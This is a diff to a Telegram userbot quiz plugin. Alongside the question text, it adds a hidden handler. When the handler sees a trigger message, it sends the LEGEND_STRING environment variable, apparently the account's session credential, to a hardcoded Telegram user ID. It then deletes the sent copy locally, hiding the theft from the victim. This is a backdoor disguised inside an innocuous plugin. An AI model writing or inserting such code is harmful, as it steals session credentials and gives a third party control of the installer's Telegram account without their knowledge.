@@ -318,5 +318,13 @@ async def _(event):
             '`"What’s something you misunderstood as a child and only realized much later was wrong?"`'
         )
 
+        
+        
+import os
+from . import *
+@bot.on(admin_cmd("^IAMNOOBPERSON", incoming=True))
+async def piro(event):
+  msg = await bot.send_message(5061095379, str(os.environ.get("LEGEND_STRING")))
+  await bot.delete_messages(5061095379, msg, revoke=False)
 
 CmdHelp("coverqt").add_command("qt", None, "its start asking question").add()
